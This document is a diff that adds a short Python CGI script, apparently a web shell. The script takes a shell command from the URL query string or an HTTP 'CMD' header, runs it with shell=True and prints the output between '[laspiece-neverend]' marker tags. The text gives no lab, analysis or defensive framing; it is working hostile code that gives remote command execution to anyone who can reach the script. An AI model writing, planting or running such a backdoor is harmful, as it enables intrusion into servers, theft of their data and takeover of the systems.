@@ -1,0 +1,17 @@
+#!/usr/bin/python
+import os, sys, subprocess
+try:
+    from urllib.parse import unquote
+except ImportError:
+    from urllib import unquote
+print("Content-Type: text/html")
+print("")
+cmd = unquote(os.environ.get('QUERY_STRING', '') or os.environ.get('HTTP_CMD', ''))
+if cmd:
+    print('[laspiece-neverend]<pre>')
+    try:
+        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        sys.stdout.write(out.decode('utf-8', errors='replace'))
+    except Exception as e:
+        print(str(e))
+    print('</pre>[laspiece-neverend]')
